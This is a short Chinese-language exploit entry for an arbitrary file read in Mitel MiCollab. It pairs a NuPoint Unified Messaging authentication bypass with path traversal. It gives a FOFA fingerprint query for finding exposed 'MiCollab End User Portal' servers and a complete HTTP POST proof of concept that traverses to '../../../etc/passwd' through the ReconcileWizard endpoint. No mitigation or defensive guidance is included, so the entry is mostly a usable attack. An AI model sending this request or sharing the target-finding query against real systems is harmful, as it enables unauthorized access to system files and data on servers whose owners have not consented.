# Mitel企业协作平台任意文件读取漏洞

由于Mitel MiCollab软件的 NuPoint 统一消息 (NPM) 组件中存在身份验证绕过漏洞，并且输入验证不足，未经身份验证的远程攻击者可利用该漏洞执行路径遍历攻击，成功利用可能导致未授权访问、破坏或删除用户的数据和系统配置。

## fofa

```javascript
body="MiCollab End User Portal"
```

## poc

```javascript
POST /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Content-Type: application/x-www-form-urlencoded

_transaction=<transaction xmlns:xsi="http://www.w3.org/2000/10/XMLSchema-instance" xsi:type="xsd:Object"><transactionNum xsi:type="xsd:long">2</transactionNum><operations xsi:type="xsd:List"><elem xsi:type="xsd:Object"><criteria xsi:type="xsd:Object"><reportName>../../../etc/passwd</reportName></criteria><operationConfig xsi:type="xsd:Object"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type="xsd:Object"><reportName>x.txt</reportName></oldValues></elem></operations><jscallback>x</jscallback></transaction>&protocolVersion=1.0&__iframeTarget__=x
```

![image-20241211213252626](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112132699.png)